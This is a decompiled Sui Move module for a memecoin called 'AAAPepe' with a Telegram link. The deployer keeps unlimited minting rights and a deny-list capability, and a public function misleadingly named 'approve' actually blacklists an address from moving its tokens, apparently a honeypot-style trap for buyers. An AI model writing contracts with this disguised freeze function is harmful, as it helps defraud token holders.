module 0x7bb0126c9ac7cef8ae2c41709419188ed76ed614fcd65d44c8892863b4a2e2a9::aaapepe {
    struct AAAPEPE has drop {
        dummy_field: bool,
    }

    public entry fun approve(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<AAAPEPE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<AAAPEPE>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: AAAPEPE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<AAAPEPE>(arg0, 2, b"AAAPepe", b"AAAPepe", b"AAAPepeee IS THE PEPE BUT ON SUI https://t.me/aaapepeglobal", 0x1::option::none<0x2::url::Url>(), false, arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<AAAPEPE>>(v2);
        let v3 = 0x2::tx_context::sender(arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<AAAPEPE>>(v0, v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<AAAPEPE>>(v1, v3);
    }

    // decompiled from Move bytecode v6
}

